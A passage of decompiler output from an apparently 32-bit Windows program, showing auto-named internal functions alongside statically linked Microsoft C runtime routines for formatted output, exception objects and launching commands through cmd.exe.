  {
    if ( a3 )
    {
      v4 = sub_47FA25(v3);
      if ( v4 )
      {
        v6 = 2;
        v7 = v4;
LABEL_5:
        result = 1;
        a2[45] = (v9 + 1) % a2[40];
        *a1 = v6;
        a1[1] = (int)v3;
        a1[2] = v7;
        return result;
      }
    }
    else if ( sub_47FA7F(v3) )
    {
      v6 = 8;
      goto LABEL_5;
    }
    v3 = (int *)sub_47581D(&v9, v8, a2 + 24);
  }
  return 0;
}
// 483069: variable 'v7' is possibly undefined

//----- (0048309F) --------------------------------------------------------
char __stdcall sub_48309F(_DWORD *a1, _DWORD *a2)
{
  int v2; // edi
  int v3; // esi
  char result; // al
  _DWORD *v5; // esi
  int v6[3]; // [esp+Ch] [ebp-14h] BYREF
  int i; // [esp+18h] [ebp-8h]
  int v8; // [esp+1Ch] [ebp-4h] BYREF

  v2 = sub_48207E(a2, &v8);
  for ( i = v8; ; v2 = sub_47581D(&v8, i, a2 + 24) )
  {
    if ( !v2 )
      return 0;
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 12))(v2);
    if ( v3 )
      break;
  }
  a2[45] = (v8 + 1) % a2[40];
  v5 = sub_481E2B(v6, v3);
  result = 1;
  *a1 = *v5++;
  a1[1] = *v5;
  a1[2] = v5[1];
  return result;
}
// 48309F: using guessed type int var_14[3];

//----- (00483120) --------------------------------------------------------
char __stdcall sub_483120(int *a1, _DWORD *a2, char a3)
{
  int v3; // esi
  void *v4; // ebx
  char result; // al
  int v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+18h] [ebp-8h]
  int v8; // [esp+1Ch] [ebp-4h] BYREF

  v3 = sub_48207E(a2, &v8);
  v7 = v8;
  while ( v3 )
  {
    if ( a3 )
    {
      v4 = sub_4800C2(v3, 0);
      if ( v4 )
      {
        v6 = 4;
LABEL_5:
        result = 1;
        a2[45] = (v8 + 1) % a2[40];
        *a1 = v6;
        a1[1] = v3;
        a1[2] = (int)v4;
        return result;
      }
    }
    else
    {
      v4 = sub_47FC89(v3);
      if ( v4 )
      {
        v6 = 16;
        goto LABEL_5;
      }
    }
    v3 = sub_47581D(&v8, v7, a2 + 24);
  }
  return 0;
}

//----- (004831B8) --------------------------------------------------------
unsigned int __thiscall sub_4831B8(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int result; // eax

  result = a2 - this[66];
  if ( result > 0x64 )
  {
    result = a3;
    this[66] = a2;
    this[67] = a3;
  }
  return result;
}

//----- (004831DE) --------------------------------------------------------
unsigned int __thiscall sub_4831DE(_DWORD *this, int a2, unsigned int a3)
{
  unsigned int result; // eax

  result = a2 - this[50];
  if ( result > 0x64 )
  {
    result = a3;
    this[50] = a2;
    this[51] = a3;
  }
  return result;
}

//----- (00483204) --------------------------------------------------------
bool __thiscall sub_483204(_DWORD *this, int a2, int a3, int a4, char a5)
{
  _DWORD *v7; // eax
  char v8; // bl
  bool v9; // zf

  if ( a2 == a3 )
    return 1;
  v7 = (_DWORD *)(a2 + 12);
  v8 = 0;
  switch ( a4 )
  {
    case 0:
      return (*v7 & 0xFFFFFFF) != 0;
    case 1:
      if ( (*v7 & 0xFFFFFFF) == 0 )
        return 1;
      v9 = !sub_481DDF((_DWORD *)(*this + 148), (_DWORD *)(a2 + 12));
      break;
    case 2:
      if ( (*v7 & 0xFFFFFFF) == 0 || sub_481DDF((_DWORD *)(*this + 148), (_DWORD *)(a2 + 12)) )
        return 1;
      if ( !sub_476193((_DWORD *)(this[1] + 60), a2 + 28) )
        return v8;
      v9 = a5 == 0;
      break;
    default:
      return v8;
  }
  if ( v9 )
    return 1;
  return v8;
}

//----- (00483290) --------------------------------------------------------
char __thiscall sub_483290(_DWORD **this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *i; // eax
  int v6; // [esp+4h] [ebp-4h] BYREF

  v6 = 0;
  for ( i = (_DWORD *)sub_481FF6(this[1], &v6, -1); ; i = (_DWORD *)sub_481FF6(this[1], &v6, 0) )
  {
    if ( !i )
      return 0;
    if ( i != a3 && sub_4832D2((int)this, a2, i, 0) )
      break;
  }
  return 1;
}

//----- (004832D2) --------------------------------------------------------
char __thiscall sub_4832D2(int this, _DWORD *a2, _DWORD *a3, int *a4)
{
  int *i; // eax
  __int32 v6; // eax
  int *v7; // esi
  char result; // al
  _DWORD *v9; // esi
  int v10[3]; // [esp+Ch] [ebp-10h] BYREF
  int v11; // [esp+18h] [ebp-4h] BYREF

  for ( i = (int *)sub_4752BA(a3, 0, a3[30], &v11); ; i = (int *)sub_4758C7(a3, &v11, 0) )
  {
    v7 = i;
    if ( !i )
      return 0;
    if ( i != a4 )
    {
      sub_4831DE(i, *(_DWORD *)(this + 16), *(_DWORD *)(this + 20));
      v6 = sub_483341(v7);
      if ( v6 )
        break;
    }
  }
  v9 = sub_481E2B(v10, v6);
  result = 1;
  *a2 = *v9++;
  a2[1] = *v9;
  a2[2] = v9[1];
  return result;
}
// 4832D2: using guessed type int var_10[3];

//----- (00483341) --------------------------------------------------------
__int32 __thiscall sub_483341(int *this)
{
  int v1; // eax
  int *v2; // ecx
  int v3; // edx

  v1 = this[5];
  v2 = this + 4;
  v3 = 0;
  if ( v1 > *v2 )
    return sub_47D3A4(v2, 0);
  return v3;
}

//----- (00483358) --------------------------------------------------------
void __thiscall sub_483358(_DWORD *this, _DWORD *a2)
{
  int v3; // eax
  int v4; // ecx
  void *v5; // eax
  void *v6; // edx

  v3 = sub_406D60(a2 + 1);
  v4 = this[1];
  v5 = *(void **)(v3 + 256);
  v6 = *(void **)(v4 + 256);
  if ( *this == 2 )
  {
    if ( v5 == v6 )
      sub_476159(v5);
    else
      sub_47E5A6(a2, v4, 0);
  }
  else if ( v5 != v6 )
  {
    sub_47E5A6(a2, v4, 1);
  }
}

//----- (004833A3) --------------------------------------------------------
int __thiscall sub_4833A3(int this)
{
  return (*(int (__cdecl **)(_DWORD))(this + 4))(*(_DWORD *)(this + 8));
}

//----- (004833B7) --------------------------------------------------------
_DWORD *__thiscall sub_4833B7(_DWORD *this, int a2, int a3)
{
  sub_47C27C(this);
  *this = &Concurrency::details::ThreadVirtualProcessor::`vftable';
  sub_47C63E((int)this, a2, a3);
  return this;
}
// 4C152C: using guessed type void *Concurrency::details::ThreadVirtualProcessor::`vftable';

//----- (004833EE) --------------------------------------------------------
_DWORD *__thiscall sub_4833EE(_DWORD *this, char a2)
{
  *this = &Concurrency::details::ThreadVirtualProcessor::`vftable';
  sub_47C2DC(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C152C: using guessed type void *Concurrency::details::ThreadVirtualProcessor::`vftable';

//----- (00483846) --------------------------------------------------------
void *__cdecl sub_483846(size_t Size)
{
  return malloc(Size);
}

//----- (0048484A) --------------------------------------------------------
char *__thiscall sub_48484A(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::__non_rtti_object::`vftable';
  return this;
}
// 4C1584: using guessed type void *std::__non_rtti_object::`vftable';

//----- (00484865) --------------------------------------------------------
char *__thiscall sub_484865(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::bad_typeid::`vftable';
  return this;
}
// 4C1578: using guessed type void *std::bad_typeid::`vftable';

//----- (00484C24) --------------------------------------------------------
_DWORD *__cdecl sub_484C24(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[1] = a2;
  *a1 = &std::__non_rtti_object::`vftable';
  return result;
}
// 4C1584: using guessed type void *std::__non_rtti_object::`vftable';

//----- (00484C40) --------------------------------------------------------
_DWORD *__cdecl sub_484C40(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[1] = a2;
  *a1 = &std::bad_cast::`vftable';
  return result;
}
// 4B8414: using guessed type void *std::bad_cast::`vftable';

//----- (004868BF) --------------------------------------------------------
char *__thiscall sub_4868BF(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 4C15C8: using guessed type void *std::bad_exception::`vftable';

//----- (004868DA) --------------------------------------------------------
_DWORD *__thiscall sub_4868DA(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad exception";
  *this = &std::bad_exception::`vftable';
  return result;
}
// 4C15C8: using guessed type void *std::bad_exception::`vftable';

//----- (004871B4) --------------------------------------------------------
int __cdecl sub_4871B4(int a1, char a2, int a3)
{
  unknown_libname_34(a2);
  DName::operator+(a1, a3);
  return a1;
}
// 486E6B: using guessed type _DWORD __stdcall unknown_libname_34(char);
// 48721A: using guessed type _DWORD __stdcall DName::operator+(_DWORD, _DWORD);

//----- (00489DB5) --------------------------------------------------------
char __thiscall sub_489DB5(_BYTE *this)
{
  return this[4];
}

//----- (0048CC98) --------------------------------------------------------
int __cdecl sub_48CC98(int a1)
{
  int result; // eax

  result = a1;
  dword_4F0D68 = a1;
  return result;
}
// 4F0D68: using guessed type int dword_4F0D68;

//----- (0048D13F) --------------------------------------------------------
int sub_48D13F()
{
  return common_flush_all(1);
}
// 48D148: using guessed type _DWORD __cdecl common_flush_all(_DWORD);

//----- (0048D8A6) --------------------------------------------------------
int __cdecl sub_48D8A6(int a1, int a2, int a3, unsigned int a4, int a5, struct __crt_locale_pointers *a6, int a7)
{
  int *v8; // edi
  int v9; // esi
  int v10; // eax
  int v11; // [esp+4h] [ebp-484h] BYREF
  char v12[12]; // [esp+8h] [ebp-480h] BYREF
  int v13; // [esp+14h] [ebp-474h]
  int v14[2]; // [esp+18h] [ebp-470h] BYREF
  int v15; // [esp+20h] [ebp-468h]
  int v16; // [esp+24h] [ebp-464h]
  int *v17; // [esp+28h] [ebp-460h] BYREF
  char v18[64]; // [esp+2Ch] [ebp-45Ch] BYREF
  char v19[1048]; // [esp+6Ch] [ebp-41Ch] BYREF

  v17 = (int *)a3;
  if ( !a5 || a4 && !a3 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&v11, a6);
  v16 = 0;
  v8 = v17;
  v13 = a1 & 2;
  v14[0] = (int)v17;
  v14[1] = a4;
  v15 = 0;
  if ( (a1 & 2) != 0 || (LOBYTE(v16) = 0, !v17) )
    LOBYTE(v16) = 1;
  v17 = v14;
  unknown_libname_44(&v17, a1, a2, a5, v12, a7);
  v9 = sub_48DF7C((int)v18);
  if ( !v8 )
    goto LABEL_22;
  if ( (a1 & 1) == 0 )
  {
    if ( v13 )
    {
      if ( !a4 )
        goto LABEL_22;
      if ( v9 < 0 )
      {
        *(_BYTE *)v8 = 0;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
      {
LABEL_21:
        *((_BYTE *)v8 + v10) = 0;
        goto LABEL_22;
      }
    }
    else
    {
      if ( !a4 )
      {
LABEL_26:
        v9 = -1;
        goto LABEL_22;
      }
      v10 = v15;
      if ( v15 != a4 )
        goto LABEL_21;
      v9 = -2;
    }
    *((_BYTE *)v8 + a4 - 1) = 0;
    goto LABEL_22;
  }
  if ( !a4 && v9 )
    goto LABEL_26;
  v10 = v15;
  if ( v15 != a4 )
    goto LABEL_21;
  if ( v9 >= 0 && v9 > a4 )
    goto LABEL_26;
LABEL_22:
  __crt_stdio_output::formatting_buffer::~formatting_buffer((__crt_stdio_output::formatting_buffer *)v19);
  if ( v12[8] )
    *(_DWORD *)(v11 + 848) &= ~2u;
  return v9;
}
// 48DD42: using guessed type _DWORD __stdcall unknown_libname_44(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 48DD77: using guessed type _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct __crt_locale_pointers *const);
// 48DDFA: using guessed type void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(__crt_stdio_output::formatting_buffer *__hidden this);
// 48D8A6: using guessed type char var_45C[64];
// 48D8A6: using guessed type char var_41C[1048];

//----- (0048DF7C) --------------------------------------------------------
int __thiscall sub_48DF7C(int this)
{
  int v3; // eax
  char v4; // al
  char v5; // al

  if ( !(unsigned __int8)unknown_libname_55(this + 1096) )
    return -1;
  if ( *(_DWORD *)(this + 16) )
  {
    while ( ++*(_DWORD *)(this + 1104) != 2 )
    {
      *(_DWORD *)(this + 56) = 0;
      *(_DWORD *)(this + 28) = 0;
      while ( 1 )
      {
        v5 = **(_BYTE **)(this + 16);
        *(_BYTE *)(this + 49) = v5;
        if ( !v5 )
          break;
        ++*(_DWORD *)(this + 16);
        if ( *(int *)(this + 24) < 0 )
          goto LABEL_21;
        v3 = unknown_libname_46(*(_BYTE *)(this + 49), *(_DWORD *)(this + 28));
        *(_DWORD *)(this + 28) = v3;
        if ( v3 == 8 )
          goto LABEL_4;
        switch ( v3 )
        {
          case 0:
            v4 = sub_48E0E1((char *)this);
            break;
          case 1:
            *(_DWORD *)(this + 40) = -1;
            *(_DWORD *)(this + 36) = 0;
            *(_BYTE *)(this + 48) = 0;
            *(_DWORD *)(this + 32) = 0;
            *(_DWORD *)(this + 44) = 0;
            *(_BYTE *)(this + 60) = 0;
            continue;
          case 2:
            v4 = unknown_libname_48(this);
            break;
          case 3:
            v4 = sub_48E54B(this);
            break;
          case 4:
            *(_DWORD *)(this + 40) = 0;
            continue;
          case 5:
            v4 = sub_48E18B(this);
            break;
          case 6:
            v4 = sub_48E1B3((_BYTE *)this);
            break;
          case 7:
            v4 = sub_48E31C(this);
            break;
          default:
            return -1;
        }
        if ( !v4 )
          return -1;
      }
      ++*(_DWORD *)(this + 16);
LABEL_21:
      if ( !(unsigned __int8)unknown_libname_56(this) )
        return -1;
    }
    return *(_DWORD *)(this + 24);
  }
  else
  {
LABEL_4:
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 48DE8F: using guessed type _DWORD __stdcall unknown_libname_46(char, _DWORD);
// 48E0A4: using guessed type int __thiscall unknown_libname_48(_DWORD);
// 48EA87: using guessed type int __thiscall unknown_libname_55(_DWORD);
// 48EAA2: using guessed type int __thiscall unknown_libname_56(_DWORD);

//----- (0048E0E1) --------------------------------------------------------
char __thiscall sub_48E0E1(char *this)
{
  if ( sub_48E100(this) )
    return 1;
  *_errno() = 22;
  _invalid_parameter_noinfo();
  return 0;
}

//----- (0048E100) --------------------------------------------------------
char __thiscall sub_48E100(char *this)
{
  char result; // al

  result = unknown_libname_49(0);
  if ( result )
  {
    __crt_stdio_output::string_output_adapter<char>::write_character(this[49], this + 24);
    return 1;
  }
  return result;
}
// 48E12A: using guessed type _DWORD __stdcall unknown_libname_49(_DWORD);
// 48EAC4: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_character(char, _DWORD);

//----- (0048E18B) --------------------------------------------------------
char __thiscall sub_48E18B(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_47(this + 40);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 40) = v2;
  if ( v2 < 0 )
    *(_DWORD *)(this + 40) = -1;
  return 1;
}
// 48DF20: using guessed type _DWORD __stdcall unknown_libname_47(_DWORD);

//----- (0048E1B3) --------------------------------------------------------
char __thiscall sub_48E1B3(_BYTE *this)
{
  char v1; // al
  _BYTE *v3; // eax
  char *v4; // edx
  char v5; // al
  _BYTE *v6; // eax

  v1 = this[49];
  if ( v1 == 70 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 7;
      return sub_48E31C((int)this);
    }
    return 1;
  }
  if ( v1 == 78 )
  {
    if ( (*(_DWORD *)this & 8) == 0 )
    {
      *((_DWORD *)this + 7) = 8;
LABEL_7:
      *_errno() = 22;
      _invalid_parameter_noinfo();
      return 0;
    }
  }
  else
  {
    if ( *((_DWORD *)this + 11) )
      goto LABEL_7;
    if ( v1 > 106 )
    {
      switch ( v1 )
      {
        case 'l':
          v6 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v6 == 108 )
          {
            *((_DWORD *)this + 11) = 4;
            *((_DWORD *)this + 4) = v6 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 3;
          }
          break;
        case 't':
          *((_DWORD *)this + 11) = 7;
          break;
        case 'w':
          *((_DWORD *)this + 11) = 12;
          break;
        case 'z':
          *((_DWORD *)this + 11) = 6;
          break;
      }
    }
    else
    {
      switch ( v1 )
      {
        case 'j':
          *((_DWORD *)this + 11) = 5;
          break;
        case 'I':
          v4 = (char *)*((_DWORD *)this + 4);
          v5 = *v4;
          if ( *v4 == 51 && v4[1] == 50 )
          {
            *((_DWORD *)this + 11) = 10;
            *((_DWORD *)this + 4) = v4 + 2;
          }
          else if ( v5 == 54 && v4[1] == 52 )
          {
            *((_DWORD *)this + 11) = 11;
            *((_DWORD *)this + 4) = v4 + 2;
          }
          else if ( v5 == 100 || v5 == 105 || v5 == 111 || v5 == 117 || v5 == 120 || v5 == 88 )
          {
            *((_DWORD *)this + 11) = 9;
          }
          break;
        case 'L':
          *((_DWORD *)this + 11) = 8;
          break;
        case 'T':
          *((_DWORD *)this + 11) = 13;
          break;
        case 'h':
          v3 = (_BYTE *)*((_DWORD *)this + 4);
          if ( *v3 == 104 )
          {
            *((_DWORD *)this + 11) = 1;
            *((_DWORD *)this + 4) = v3 + 1;
          }
          else
          {
            *((_DWORD *)this + 11) = 2;
          }
          break;
      }
    }
  }
  return 1;
}

//----- (0048E31C) --------------------------------------------------------
char __thiscall sub_48E31C(int this)
{
  char v2; // bl
  int v3; // eax
  char v4; // al
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edx
  int v11; // edi
  char v12; // cl
  bool v13; // al
  bool v14; // al
  int v15; // ebx
  char v16; // [esp-4h] [ebp-10h]
  __int16 v17; // [esp+8h] [ebp-4h] BYREF
  char v18; // [esp+Ah] [ebp-2h]

  v2 = 1;
  v3 = *(char *)(this + 49);
  if ( v3 <= 100 )
  {
    if ( v3 != 100 )
    {
      if ( v3 > 88 )
      {
        v6 = v3 - 90;
        if ( !v6 )
        {
          v4 = unknown_libname_50(this);
          goto LABEL_11;
        }
        v7 = v6 - 7;
        if ( !v7 )
          goto LABEL_31;
        if ( v7 != 2 )
          return 0;
        goto LABEL_18;
      }
      if ( v3 != 88 )
      {
        if ( v3 != 65 )
        {
          if ( v3 != 67 )
          {
            if ( v3 <= 68 )
              return 0;
            if ( v3 > 71 )
            {
              if ( v3 == 83 )
              {
LABEL_10:
                v4 = unknown_libname_54(this);
                goto LABEL_11;
              }
              return 0;
            }
            goto LABEL_31;
          }
LABEL_18:
          v4 = unknown_libname_52(0);
          goto LABEL_11;
        }
LABEL_31:
        v4 = unknown_libname_51(this);
        goto LABEL_11;
      }
      v16 = 1;
LABEL_14:
      v4 = sub_48E81F((_DWORD *)this, 16, v16);
      goto LABEL_11;
    }
    goto LABEL_28;
  }
  if ( v3 > 112 )
  {
    v8 = v3 - 115;
    if ( !v8 )
      goto LABEL_10;
    v9 = v8 - 2;
    if ( v9 )
    {
      if ( v9 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v3 == 112 )
  {
    v4 = sub_48E9FC((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v3 <= 103 )
    goto LABEL_31;
  switch ( v3 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v4 = sub_48E81F((_DWORD *)this, 10, 0);
      break;
    case 'n':
      v4 = unknown_libname_53(this);
      break;
    case 'o':
      v4 = sub_48E9DD((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v4 )
    return 0;
  if ( *(_BYTE *)(this + 48) )
    return 1;
  v10 = *(_DWORD *)(this + 32);
  v17 = 0;
  v11 = 0;
  v18 = 0;
  if ( (v10 & 0x10) != 0 )
  {
    if ( (v10 & 0x40) != 0 )
    {
      LOBYTE(v17) = 45;
LABEL_46:
      v11 = 1;
      goto LABEL_47;
    }
    if ( (v10 & 1) != 0 )
    {
      LOBYTE(v17) = 43;
      goto LABEL_46;
    }
    if ( (v10 & 2) != 0 )
    {
      LOBYTE(v17) = 32;
      goto LABEL_46;
    }
  }
LABEL_47:
  v12 = *(_BYTE *)(this + 49);
  if ( v12 != 120 && v12 != 88 || (v10 & 0x20) == 0 )
    v2 = 0;
  v13 = v12 == 97 || v12 == 65;
  if ( v2 || v13 )
  {
    *((_BYTE *)&v17 + v11) = 48;
    v14 = v12 == 88 || v12 == 65;
    *((_BYTE *)&v17 + v11 + 1) = !v14 ? 120 : 88;
    v11 += 2;
  }
  v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v11;
  if ( (v10 & 0xC) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  __crt_stdio_output::string_output_adapter<char>::write_string(&v17, v11, this + 24, *(_DWORD *)(this + 12));
  if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      48,
      v15,
      this + 24);
  unknown_libname_57(0);
  if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
    __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(
      this + 1096,
      32,
      v15,
      this + 24);
  return 1;
}
// 48DC93: using guessed type _DWORD __cdecl __crt_stdio_output::write_multiple_characters<__crt_stdio_output::string_output_adapter<char>,char>(_DWORD, _DWORD, _DWORD, _DWORD);
// 48E5D2: using guessed type int __thiscall unknown_libname_50(_DWORD);
// 48E635: using guessed type int __thiscall unknown_libname_51(_DWORD);
// 48E78F: using guessed type _DWORD __stdcall unknown_libname_52(_DWORD);
// 48E969: using guessed type int __thiscall unknown_libname_53(_DWORD);
// 48EA14: using guessed type int __thiscall unknown_libname_54(_DWORD);
// 48EB06: using guessed type _DWORD __stdcall unknown_libname_57(_DWORD);
// 48EBAD: using guessed type _DWORD __stdcall __crt_stdio_output::string_output_adapter<char>::write_string(void *Src, _DWORD, _DWORD, _DWORD);

//----- (0048E54B) --------------------------------------------------------
char __thiscall sub_48E54B(int this)
{
  int v2; // eax

  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_47(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v2 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *(_DWORD *)(this + 36) = v2;
  if ( v2 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *(_DWORD *)(this + 36) = -*(_DWORD *)(this + 36);
  }
  return 1;
}
// 48DF20: using guessed type _DWORD __stdcall unknown_libname_47(_DWORD);

//----- (0048E81F) --------------------------------------------------------
char __thiscall sub_48E81F(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  int v5; // ebx
  int v7; // ecx
  __int64 v8; // rax
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax

  v4 = __crt_stdio_output::to_integer_size(this[11]);
  v5 = v4;
  switch ( v4 )
  {
    case 1:
      v13 = this[8];
      this[5] += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = this[5];
      if ( v10 )
        LODWORD(v8) = *(unsigned __int8 *)(v14 - 4);
      else
        LODWORD(v8) = *(char *)(v14 - 4);
      goto LABEL_16;
    case 2:
      v11 = this[8];
      this[5] += 4;
      v10 = (v11 & 0x10) == 0;
      v12 = this[5];
      if ( v10 )
        LODWORD(v8) = *(unsigned __int16 *)(v12 - 4);
      else
        LODWORD(v8) = *(__int16 *)(v12 - 4);
LABEL_16:
      v8 = (int)v8;
      v7 = v8;
      goto LABEL_17;
    case 4:
      v9 = this[8];
      this[5] += 4;
      v10 = (v9 & 0x10) == 0;
      LODWORD(v8) = this[5];
      if ( v10 )
      {
        v7 = *(_DWORD *)(v8 - 4);
        HIDWORD(v8) = 0;
        goto LABEL_17;
      }
      LODWORD(v8) = *(_DWORD *)(v8 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  this[5] += 8;
  LODWORD(v8) = this[5];
  v7 = *(_DWORD *)(v8 - 8);
  HIDWORD(v8) = *(_DWORD *)(v8 - 4);
LABEL_17:
  if ( (this[8] & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    HIDWORD(v8) = (unsigned __int64)-__SPAIR64__(HIDWORD(v8), v7) >> 32;
    this[8] |= 0x40u;
  }
  if ( (int)this[10] >= 0 )
  {
    this[8] &= ~8u;
    if ( (int)this[10] > 512 )
      this[10] = 512;
  }
  else
  {
    this[10] = 1;
  }
  if ( !__PAIR64__(v7, HIDWORD(v8)) )
    this[8] &= ~0x20u;
  if ( v5 == 8 )
    unknown_libname_42(v7, HIDWORD(v8), a2, a3);
  else
    unknown_libname_41(v7, a2, a3);
  if ( (this[8] & 0x80) != 0 && (!this[14] || *(_BYTE *)this[13] != 48) )
  {
    *(_BYTE *)--this[13] = 48;
    ++this[14];
  }
  return 1;
}
// 48DB96: using guessed type _DWORD __stdcall unknown_libname_41(_DWORD, _DWORD, char);
// 48DC0B: using guessed type _DWORD __stdcall unknown_libname_42(_DWORD, _DWORD, _DWORD, char);
// 48E576: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (0048E9DD) --------------------------------------------------------
char __thiscall sub_48E9DD(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_48E81F(this, 8, 0);
}

//----- (0048E9FC) --------------------------------------------------------
char __thiscall sub_48E9FC(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_48E81F(this, 16, 1);
}

//----- (0048EF19) --------------------------------------------------------
int __cdecl sub_48EF19(int a1)
{
  return unknown_libname_58(a1);
}
// 48EDAD: using guessed type _DWORD __stdcall unknown_libname_58(_DWORD);

//----- (0048F008) --------------------------------------------------------
intptr_t __cdecl sub_48F008(char *a1)
{
  intptr_t v1; // esi
  int v2; // edi
  intptr_t v3; // ebx
  int *v4; // eax
  void *Block; // [esp+Ch] [ebp-18h] BYREF
  char *FileName[4]; // [esp+10h] [ebp-14h] BYREF

  v1 = 0;
  Block = 0;
  if ( _dupenv_s((char **)&Block, 0, "COMSPEC") == 22 )
    _invoke_watson(0, 0, 0, 0, 0);
  if ( a1 )
  {
    FileName[0] = (char *)Block;
    FileName[1] = "/c";
    FileName[2] = a1;
    FileName[3] = 0;
    if ( Block )
    {
      v2 = *_errno();
      *_errno() = 0;
      v3 = _spawnve(0, FileName[0], (const char *const *)FileName, 0);
      v4 = _errno();
      if ( v3 != -1 )
      {
        *v4 = v2;
        v1 = v3;
        goto LABEL_13;
      }
      if ( *v4 != 2 && *_errno() != 13 )
      {
        v1 = -1;
        goto LABEL_13;
      }
      *_errno() = v2;
    }
    FileName[0] = "cmd.exe";
    v1 = _spawnvpe(0, "cmd.exe", (const char *const *)FileName, 0);
    goto LABEL_13;
  }
  if ( Block )
    v1 = _access_s((const char *)Block, 0) == 0;
LABEL_13:
  _free_base(Block);
  return v1;
}

//----- (0048F108) --------------------------------------------------------
intptr_t __cdecl sub_48F108(char *a1)
{
  return sub_48F008(a1);
}

//----- (0048F113) --------------------------------------------------------
int __cdecl sub_48F113(_DWORD *a1)
{
  if ( a1 )
  {
    *a1 = dword_4F1334;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
}
// 4F1334: using guessed type int dword_4F1334;

//----- (0048F5E2) --------------------------------------------------------
int __cdecl sub_48F5E2(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
           &v3,
           a2,
           &v4);
}
// 48F591: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);
// 48F5E2: using guessed type int var_8;

//----- (0048FB35) --------------------------------------------------------
int __cdecl sub_48FB35(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(
           &v3,
           a2,
           &v4);
}
// 48FAE4: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD);
// 48FB35: using guessed type int var_8;

//----- (004908CE) --------------------------------------------------------
double __cdecl sub_4908CE(int a1, _DWORD *a2, struct __crt_locale_pointers *a3)
{
  int v4; // ecx
  int v5; // eax
  int v6; // [esp-Ch] [ebp-2Ch] BYREF
